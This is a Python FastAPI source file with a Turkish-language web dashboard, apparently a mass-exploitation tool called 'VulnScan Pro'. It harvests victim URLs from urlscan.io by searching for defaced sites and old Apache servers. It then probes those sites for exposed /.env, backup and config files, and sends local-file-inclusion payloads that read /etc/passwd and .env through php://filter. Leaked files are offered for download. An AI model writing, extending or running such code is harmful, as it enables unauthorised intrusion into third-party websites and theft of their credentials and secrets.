from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Pro - Manual Access")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS findings 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      payload TEXT, extracted_data TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            "type": "log",
            "time": self.format(record).split('|')[0].strip(),
            "level": record.levelname,
            "message": self.format(record).split('|')[-1].strip()
        }
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET LİSTELERİ ---
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

COMMON_DIRS = ["/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php"]
LFI_PAYLOADS = ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=.env"]

# --- ASENKRON VERİTABANI KAYDI ---
async def save_finding(url, vuln, payload, data):
    def db_insert():
        with get_db() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO findings (target_url, vuln_type, payload, extracted_data, timestamp) 
                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
            conn.commit()
    await asyncio.to_thread(db_insert)

# --- TARAMA MOTORU ---
async def scan_and_exploit(session, target_url, config):
    report = {"target": target_url, "discovered": [], "status": "OK"}
    
    try:
        async with session.get(target_url, timeout=5, ssl=False, allow_redirects=True, headers=HEADERS) as response:
            if response.status not in [200, 301, 302]:
                report["status"] = f"HTTP {response.status}"
                await manager.broadcast({"type": "scan_result", "data": report})
                return

            # Dizin Keşfi
            if config.get("dirs"):
                for path in COMMON_DIRS:
                    test_url = f"{target_url.rstrip('/')}{path}"
                    try:
                        async with session.get(test_url, timeout=3, ssl=False, headers=HEADERS) as res:
                            if res.status == 200:
                                content_length = res.headers.get('Content-Length', 'Bilinmiyor')
                                report["discovered"].append({
                                    "path": path,
                                    "url": test_url,
                                    "status": res.status,
                                    "size": content_length
                                })
                    except: pass

            # LFI Keşfi
            if config.get("lfi"):
                for payload in LFI_PAYLOADS:
                    test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                    try:
                        async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                            text = await res.text()
                            if "root:x:0:0" in text or (payload.startswith("php://") and len(text) > 50):
                                report["discovered"].append({
                                    "path": f"LFI Payload: {payload}",
                                    "url": test_url,
                                    "status": res.status,
                                    "size": f"{len(text)} bytes"
                                })
                    except: pass

    except Exception:
        report["status"] = "ERROR"
        
    if report["discovered"]:
        report["status"] = "SIZILDI"
        
    await manager.broadcast({"type": "scan_result", "data": report})

# --- ARKA PLAN PİPELINE ---
async def run_scan_pipeline(config: dict):
    limit = config.get("limit", 50)
    threads = config.get("threads", 50)
    
    logger.info(f"Manuel İnceleme Taraması Başlatıldı. Limit: {limit}")
    
    connector = aiohttp.TCPConnector(limit=threads, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        targets = set()
        try:
            queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"']
            for q in queries:
                if len(targets) >= limit: break
                url = f"https://urlscan.io/api/v1/search/?q={urllib.parse.quote(q)}&size={limit}"
                async with session.get(url, timeout=10) as res:
                    if res.status == 200:
                        data = await res.json()
                        for result in data.get('results', []):
                            page_url = result.get('page', {}).get('url')
                            if page_url and page_url.startswith("http"):
                                targets.add(page_url)
        except Exception as e:
            logger.error(f"OSINT Hatası: {e}")
            
        if not targets:
            logger.warning("Taranacak hedef bulunamadı.")
            return
            
        logger.info(f"Toplam {len(targets)} hedef bulundu. Tarama başlıyor...")
        
        semaphore = asyncio.Semaphore(threads)
        async def limited_scan(url):
            async with semaphore:
                await scan_and_exploit(session, url, config)

        tasks = [limited_scan(url) for url in targets]
        await asyncio.gather(*tasks)
        
    logger.info("Tarama Tamamlandı.")

# --- API ENDPOINT'LERİ ---
class ScanConfig(BaseModel):
    limit: int
    threads: int
    dirs: bool
    lfi: bool

@app.post("/api/scan")
async def start_scan(config: ScanConfig, background_tasks: BackgroundTasks):
    background_tasks.add_task(run_scan_pipeline, config.dict())
    return {"status": "started"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan Pro | Manual Access</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #090a0f; --panel: #12141c; --border: #1f2330;
                --text: #e2e8f0; --accent: #6366f1; --danger: #ef4444;
                --warning: #f59e0b; --success: #10b981;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; overflow: hidden; }
            .sidebar { width: 320px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .brand { padding: 20px; border-bottom: 1px solid var(--border); }
            .brand h1 { font-size: 1.2rem; font-weight: 800; color: #fff; }
            .brand p { font-size: 0.75rem; color: var(--accent); font-weight: 600; letter-spacing: 1px; }
            .settings { padding: 20px; flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
            .setting-group { display: flex; flex-direction: column; gap: 5px; }
            .setting-group label { font-size: 0.8rem; color: #94a3b8; font-weight: 600; }
            .setting-group input[type="number"] { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; }
            .checkbox-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 5px; }
            .checkbox-group label { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: var(--text); cursor: pointer; background: var(--bg); padding: 8px; border: 1px solid var(--border); border-radius: 4px; }
            .checkbox-group input { accent-color: var(--accent); }
            .btn-start { background: var(--accent); color: #fff; border: none; padding: 15px; border-radius: 6px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.2s; margin-top: 10px; }
            .btn-start:hover { background: #4f46e5; }
            .btn-start:disabled { background: #334155; cursor: not-allowed; }
            .main-content { flex: 1; display: flex; flex-direction: column; }
            .stats-bar { display: flex; background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; gap: 30px; }
            .stat-item { display: flex; flex-direction: column; }
            .stat-label { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; }
            .stat-value { font-size: 1.4rem; font-family: 'JetBrains Mono', monospace; font-weight: 700; }
            .stat-value.scanned { color: var(--accent); }
            .stat-value.vuln { color: var(--danger); }
            .stat-value.clean { color: var(--success); }
            .stat-value.error { color: var(--warning); }
            .content-layout { display: flex; flex: 1; overflow: hidden; }
            .terminal-panel { width: 35%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .panel-header { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.8rem; color: #94a3b8; font-weight: 600; text-transform: uppercase; display: flex; justify-content: space-between; }
            .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
            .log-line { margin-bottom: 4px; word-wrap: break-word; }
            .log-time { color: #475569; }
            .log-info { color: var(--accent); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }
            
            /* Card Layout */
            .results-panel { width: 65%; display: flex; flex-direction: column; background: var(--bg); }
            .results-list { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
            .site-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
            .site-card.sizildi { border-left: 4px solid var(--danger); }
            .site-card.temiz { border-left: 4px solid var(--success); }
            .site-card.hata { border-left: 4px solid var(--warning); opacity: 0.7; }
            
            .site-header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; background: #1a1e29; }
            .site-url { font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; color: var(--text); word-break: break-all; }
            .site-status { font-size: 0.75rem; padding: 4px 10px; border-radius: 4px; font-weight: 600; }
            .status-sizildi { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid var(--danger); }
            .status-temiz { background: rgba(16, 185, 129, 0.1); color: var(--success); }
            .status-hata { background: rgba(245, 158, 11, 0.1); color: var(--warning); }
            
            /* Sub-paths */
            .paths-list { padding: 10px 20px; list-style: none; display: flex; flex-direction: column; gap: 8px; }
            .path-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: var(--bg); border-radius: 4px; border: 1px solid var(--border); }
            .path-info { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text); }
            .path-meta { font-size: 0.75rem; color: #64748b; margin-left: 10px; }
            .path-actions { display: flex; gap: 8px; }
            .btn-small { padding: 6px 12px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; cursor: pointer; text-decoration: none; transition: 0.2s; color: #fff; }
            .btn-open { background: var(--accent); }
            .btn-open:hover { background: #4f46e5; }
            .btn-download { background: var(--danger); }
            .btn-download:hover { background: #dc2626; }
        </style>
    </head>
    <body>
        <div class="sidebar">
            <div class="brand">
                <h1>VulnScan Pro</h1>
                <p>MANUAL ACCESS ENGINE</p>
            </div>
            <div class="settings">
                <div class="setting-group">
                    <label>Hedef Limiti</label>
                    <input type="number" id="limit" value="50" min="10" max="1000">
                </div>
                <div class="setting-group">
                    <label>Eşzamanlı İstek</label>
                    <input type="number" id="threads" value="50" min="10" max="200">
                </div>
                
                <div class="setting-group" style="margin-top: 10px;">
                    <label>Tarama Modülleri</label>
                    <div class="checkbox-group">
                        <label><input type="checkbox" id="mod-dirs" checked> Dizin Keşfi</label>
                        <label><input type="checkbox" id="mod-lfi" checked> LFI Keşfi</label>
                    </div>
                </div>

                <button class="btn-start" id="startBtn" onclick="startScan()">TARAMAYI BAŞLAT</button>
            </div>
        </div>

        <div class="main-content">
            <div class="stats-bar">
                <div class="stat-item">
                    <span class="stat-label">Taranan</span>
                    <span class="stat-value scanned" id="stat-scanned">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Keşfedilen</span>
                    <span class="stat-value vuln" id="stat-vuln">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Temiz</span>
                    <span class="stat-value clean" id="stat-clean">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Hata</span>
                    <span class="stat-value error" id="stat-error">0</span>
                </div>
            </div>

            <div class="content-layout">
                <div class="terminal-panel">
                    <div class="panel-header">Sistem Logları</div>
                    <div id="terminal" class="terminal"></div>
                </div>
                
                <div class="results-panel">
                    <div class="panel-header">Tarama Sonuçları ve Alt Kademeler</div>
                    <div id="results-list" class="results-list"></div>
                </div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');
            const resultsList = document.getElementById('results-list');
            
            let stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === "log") {
                    const line = document.createElement("div");
                    line.className = "log-line";
                    let colorClass = "log-info";
                    if (data.level === "WARNING") colorClass = "log-warning";
                    if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";

                    line.innerHTML = `<span class="log-time">[${data.time}]</span> <span class="${colorClass}">${data.message}</span>`;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                } 
                else if (data.type === "scan_result") {
                    stats.scanned++;
                    
                    const res = data.data;
                    let cardClass = "site-card";
                    let statusClass = "";
                    let statusText = "";
                    
                    if (res.status === "SIZILDI") {
                        stats.vuln++;
                        cardClass += " sizildi";
                        statusClass = "status-sizildi";
                        statusText = "AÇIK BULUNDU";
                    } else if (res.status === "ERROR" || res.status.startsWith("HTTP")) {
                        stats.error++;
                        cardClass += " hata";
                        statusClass = "status-hata";
                        statusText = res.status;
                    } else {
                        stats.clean++;
                        cardClass += " temiz";
                        statusClass = "status-temiz";
                        statusText = "TEMİZ";
                    }

                    document.getElementById('stat-scanned').innerText = stats.scanned;
                    document.getElementById('stat-vuln').innerText = stats.vuln;
                    document.getElementById('stat-clean').innerText = stats.clean;
                    document.getElementById('stat-error').innerText = stats.error;

                    const card = document.createElement("div");
                    card.className = cardClass;
                    
                    let pathsHtml = "";
                    if (res.discovered && res.discovered.length > 0) {
                        pathsHtml = `<ul class="paths-list">`;
                        res.discovered.forEach(p => {
                            pathsHtml += `
                                <li class="path-item">
                                    <div>
                                        <span class="path-info">${p.path}</span>
                                        <span class="path-meta">(${p.size} | HTTP ${p.status})</span>
                                    </div>
                                    <div class="path-actions">
                                        <a href="${p.url}" target="_blank" class="btn-small btn-open">Aç</a>
                                        <a href="${p.url}" download class="btn-small btn-download">İndir</a>
                                    </div>
                                </li>
                            `;
                        });
                        pathsHtml += `</ul>`;
                    }

                    card.innerHTML = `
                        <div class="site-header">
                            <div class="site-url">${res.target}</div>
                            <div class="site-status ${statusClass}">${statusText}</div>
                        </div>
                        ${pathsHtml}
                    `;
                    
                    resultsList.insertBefore(card, resultsList.firstChild);
                }
            };

            async function startScan() {
                const btn = document.getElementById('startBtn');
                btn.disabled = true;
                btn.innerText = "TARANIYOR...";
                
                terminal.innerHTML = "";
                resultsList.innerHTML = "";
                stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };
                document.getElementById('stat-scanned').innerText = 0;
                document.getElementById('stat-vuln').innerText = 0;
                document.getElementById('stat-clean').innerText = 0;
                document.getElementById('stat-error').innerText = 0;

                const config = {
                    limit: parseInt(document.getElementById('limit').value),
                    threads: parseInt(document.getElementById('threads').value),
                    dirs: document.getElementById('mod-dirs').checked,
                    lfi: document.getElementById('mod-lfi').checked
                };

                try {
                    await fetch('/api/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(config)
                    });
                } catch (error) {
                    console.error("API Hatası:", error);
                } finally {
                    btn.disabled = false;
                    btn.innerText = "TARAMAYI BAŞLAT";
                }
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
